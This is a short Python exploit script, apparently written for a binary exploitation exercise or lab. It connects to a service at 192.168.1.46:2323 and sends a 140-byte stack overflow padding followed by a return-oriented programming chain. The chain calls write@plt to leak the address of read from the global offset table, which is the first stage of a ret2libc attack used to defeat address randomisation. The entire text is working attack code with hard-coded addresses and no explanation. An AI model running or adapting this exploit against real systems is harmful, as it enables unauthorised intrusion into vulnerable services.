import socket
import struct

def rop(*args):
    return struct.pack('I'*len(args), *args)

writeplt = 0x804830c
read_got = 0x804961C

for i in range(10):
    s = socket.create_connection(('192.168.1.46', 2323))

    s.send('A'*140 + rop(
        writeplt,
        0x41414141,
        1,
        read_got,
        4
        ))
    leaked_got = struct.unpack('I', s.recv(4))[0]
    print(hex(leaked_got))
    s.close()
